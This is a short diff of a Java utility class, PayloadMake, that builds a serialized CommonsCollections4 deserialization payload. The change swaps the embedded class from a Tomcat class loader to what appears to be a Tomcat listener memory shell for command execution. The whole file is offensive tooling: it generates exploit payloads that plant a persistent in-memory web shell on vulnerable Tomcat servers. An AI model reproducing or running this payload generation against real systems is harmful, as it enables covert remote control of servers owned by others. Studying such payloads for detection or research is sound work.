@@ -1,6 +1,6 @@
 package com.demo.utils;
 
-import com.demo.memshell.loader.TomcatContextClassLoader;
+import com.demo.memshell.whole.exec.TomcatListenerContextClassMS;
 import org.tools.ser.CC4Generator;
 
 /**
@@ -14,7 +14,7 @@ public class PayloadMake {
 
     public static void cc4() throws Exception {
         CC4Generator cc4Generator = new CC4Generator();
-        String payload = cc4Generator.make(TomcatContextClassLoader.class);
+        String payload = cc4Generator.make(TomcatListenerContextClassMS.class);
         System.out.println(payload.length());
     }
 
